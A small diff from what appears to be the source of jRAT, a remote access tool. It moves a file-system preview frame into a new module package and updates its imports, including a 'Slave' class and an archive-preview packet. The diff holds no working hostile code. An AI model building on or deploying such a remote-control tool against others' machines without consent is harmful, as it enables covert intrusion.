@@ -1,10 +1,11 @@
-package jrat.controller.ui.frames;
+package jrat.module.fs.ui;
 
 import iconlib.IconUtils;
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.Packet63PreviewArchive;
 import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.components.TableModel;
+import jrat.controller.ui.frames.BaseFrame;
+import jrat.module.fs.packets.Packet63PreviewArchive;
 
 import javax.swing.*;
 import javax.swing.GroupLayout.Alignment;
